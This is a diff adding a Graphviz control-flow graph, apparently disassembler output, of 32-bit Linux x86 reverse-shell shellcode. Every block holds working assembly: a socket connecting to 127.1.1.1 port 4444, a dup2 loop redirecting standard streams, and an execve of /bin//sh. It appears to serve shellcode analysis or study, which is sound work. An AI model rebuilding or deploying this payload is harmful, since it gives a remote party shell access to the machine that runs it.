@@ -1,0 +1,11 @@
+digraph code {
+	graph [bgcolor=azure fontsize=8 fontname="Courier" splines="ortho"];
+	node [fillcolor=gray style=filled shape=box];
+	edge [arrowhead="normal"];
+	"0x08048060" -> "0x08048094" [color="#005f87"];
+	"0x08048060" [URL="entry0/0x08048060", fillcolor="palegreen",color="#e03030", fontname="Courier",label=";-- section..text:\l;-- _start:\l;-- eip:\l(fcn) entry0 88\l  entry0 ();\l0x08048060      xor  eax, eax      ; [01] -r-x section size 88 named .text\l0x08048062      mov  ebx, eax\l0x08048064      mov  ecx, eax\l0x08048066      mov  edi, eax\l0x08048068      mov  esi, eax\l;-- socket:\l0x0804806a      mov  al, 0x66      ; 'f' ; 102\l0x0804806c      inc  bl\l0x0804806e      push ecx\l0x0804806f      push ebx\l0x08048070      push 2             ; 2\l0x08048072      mov  ecx, esp\l0x08048074      int  0x80\l;-- connect:\l0x08048076      mov  esi, eax\l0x08048078      mov  al, 0x66      ; 'f' ; 102\l0x0804807a      mov  bl, 3\l0x0804807c      push 0x101017f\l0x08048081      push 0x5c11\l0x08048085      push 2             ; 2\l0x08048088      mov  ecx, esp\l0x0804808a      push 0x10          ; 16\l0x0804808c      push ecx\l0x0804808d      push esi\l0x0804808e      mov  ecx, esp\l0x08048090      int  0x80\l;-- duplicate:\l0x08048092      xor  ecx, ecx\l"]
+	"0x08048094" -> "0x08048094" [color="#5f8700"];
+	"0x08048094" -> "0x0804809f" [color="#e03030"];
+	"0x08048094" [URL="entry0/0x08048094", fillcolor="white",color="#e03030", fontname="Courier",label=";-- dup2:\l0x08048094      mov  al, 0x3f      ; '?' ; 63\l0x08048096      int  0x80\l0x08048098      inc  cl\l0x0804809a      cmp  ecx, 3        ; 3\l0x0804809d      jne  loc.dup2\l"]
+	"0x0804809f" [URL="entry0/0x0804809f", fillcolor="white",color="#e03030", fontname="Courier",label=";-- execsh:\l0x0804809f      xor  eax, eax\l0x080480a1      push eax\l0x080480a2      push 0x68732f6e    ; 'n/sh'\l0x080480a7      push 0x69622f2f    ; '//bi'\l0x080480ac      mov  ebx, esp\l0x080480ae      push eax\l0x080480af      mov  edx, esp\l0x080480b1      push ebx\l0x080480b2      mov  ecx, esp\l0x080480b4      mov  al, 0xb       ; 11\l0x080480b6      int  0x80\l"]
+}
